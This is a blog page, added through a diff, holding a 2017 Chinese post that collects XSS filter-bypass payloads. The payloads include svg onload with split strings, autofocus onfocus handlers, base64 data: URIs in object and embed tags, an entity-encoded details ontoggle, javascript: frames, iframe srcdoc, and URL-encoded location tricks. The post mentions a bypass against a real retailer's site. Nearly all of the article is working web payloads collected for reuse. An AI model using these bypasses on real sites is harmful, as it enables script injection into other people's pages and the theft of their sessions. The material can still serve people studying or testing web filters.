@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="之前整理的一些xss payload。一直没有系统的整理，直接贴出来以后查起来方便。"/>
+
+
+
+
+  <meta name="keywords" content="xss" />
+
+
+
+
+
+  <link rel="alternate" href="/default" title="Bypass.World">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1" />
+
+
+
+<link rel="canonical" href="http://yoursite.com/2017/03/XSS-Payload整理/"/>
+
+
+<meta name="description" content="之前整理的一些xss payload。一直没有系统的整理，直接贴出来以后查起来方便。">
+<meta name="keywords" content="xss">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS Payload整理">
+<meta property="og:url" content="http://yoursite.com/2017/03/XSS-Payload整理/index.html">
+<meta property="og:site_name" content="Bypass.World">
+<meta property="og:description" content="之前整理的一些xss payload。一直没有系统的整理，直接贴出来以后查起来方便。">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2017-09-19T17:19:57.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS Payload整理">
+<meta name="twitter:description" content="之前整理的一些xss payload。一直没有系统的整理，直接贴出来以后查起来方便。">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1" />
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?686eedfda259ce1d887831c94f49f99f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  <script type="text/javascript">
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+        ga('create', 'UA-106734017-1', 'auto');
+        ga('send', 'pageview');
+  </script>
+
+
+
+    <title> XSS Payload整理 - Bypass.World </title>
+  </head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">Bypass.World</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="/archives">
+                            
+                            
+                                Archives
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+            </ul>
+        
+  </nav>
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          XSS Payload整理
+        
+      </h1>
+
+      <time class="post-time">
+          Mar 24 2017
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <p>之前遇到一次苏宁的xss，<a href="https://secvul.com/topics/259.html" target="_blank" rel="external">某次XSS绕过总结</a> ,当时绕着玩就整理了一波payload。</p>
+<h4 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout"></a>setTimeout</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;svg/onload=setTimeout(<span class="string">'ale'</span>+<span class="string">'rt(1)'</span>,<span class="number">0</span>)&gt;</div></pre></td></tr></table></figure>
+<h4 id="过滤双引号"><a href="#过滤双引号" class="headerlink" title="过滤双引号"></a>过滤双引号</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;input onfocus=alert(<span class="number">1</span>) autofocus&gt;</div><div class="line">&lt;select onfocus=alert(<span class="number">1</span>) autofocus&gt;</div></pre></td></tr></table></figure>
+<h4 id="chrome"><a href="#chrome" class="headerlink" title="chrome"></a>chrome</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src ?itworksonchrome?\/onerror = alert(<span class="number">1</span>)&gt;</div></pre></td></tr></table></figure>
+<h4 id="data形式"><a href="#data形式" class="headerlink" title="data形式"></a>data形式</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg&gt;<span class="xml"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span></div><div class="line">&lt;embed src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg&gt;<span class="xml"><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span></div><div class="line">&lt;script src=data:%<span class="number">26</span>comma;alert(<span class="number">1</span>)&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div></pre></td></tr></table></figure>
+<h4 id="ontoggle"><a href="#ontoggle" class="headerlink" title="ontoggle"></a>ontoggle</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;details open ontoggle=<span class="string">"&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#24050;&amp;#26159;&amp;#40644;&amp;#26127;&amp;#29420;&amp;#33258;&amp;#24833;&amp;#65292;&amp;#19968;&amp;#26525;&amp;#32418;&amp;#26447;&amp;#20986;&amp;#22681;&amp;#26469;&amp;#39;&amp;#41;"</span>&gt;</div></pre></td></tr></table></figure>
+<h4 id="frame"><a href="#frame" class="headerlink" title="frame"></a>frame</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;frame src=<span class="string">"javascript:alert(1)"</span>&gt;</div><div class="line">&lt;frame src=<span class="string">"javascript:%20%0aalert%20%0d %09(1)"</span>&gt;</div></pre></td></tr></table></figure>
+<h4 id="iframe"><a href="#iframe" class="headerlink" title="iframe"></a>iframe</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;iframe srcdoc=<span class="string">"&amp;lt;img src&amp;equals;x:x onerror&amp;equals;alert&amp;lpar;1&amp;rpar;&amp;gt;"</span> /&gt;</div></pre></td></tr></table></figure>
+<h4 id="other"><a href="#other" class="headerlink" title="other"></a>other</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;audio src</div><div class="line">&lt;video src</div></pre></td></tr></table></figure>
+<h4 id="url加密绕圆括号（20170328）"><a href="#url加密绕圆括号（20170328）" class="headerlink" title="url加密绕圆括号（20170328）"></a>url加密绕圆括号（20170328）</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;svg onload=<span class="string">'JavascRipT:alert%281%29'</span>&gt;</div><div class="line">&lt;svg/onload =<span class="string">"location='jav'+'ascript'+':%2'+'0aler'+'t%20%2'+'81%'+'29'"</span>&gt;</div></pre></td></tr></table></figure>
+
+            </div>
+          
+
+    
+      <footer class="post-footer">
+		
+		<div class="post-tags">
+		  
+			<a href="/tags/XSS/">XSS</a>
+		  
+		</div>
+		
+
+        
+        
+  <nav class="post-nav">
+    
+      <a class="prev" href="/2017/03/某牛的xss payload/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">某牛的xss payload</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    
+    
+      <a class="next" href="/2017/03/socat-meterpreter实现维持访问/">
+        <span class="next-text nav-default">socat+meterpreter实现维持访问</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    
+  </nav>
+
+        
+
+      </footer>
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2014 -
+    
+    2017
+    <span class="footer-author">Norman.Chew.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear">Polar Bear</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+  </body>
+</html>
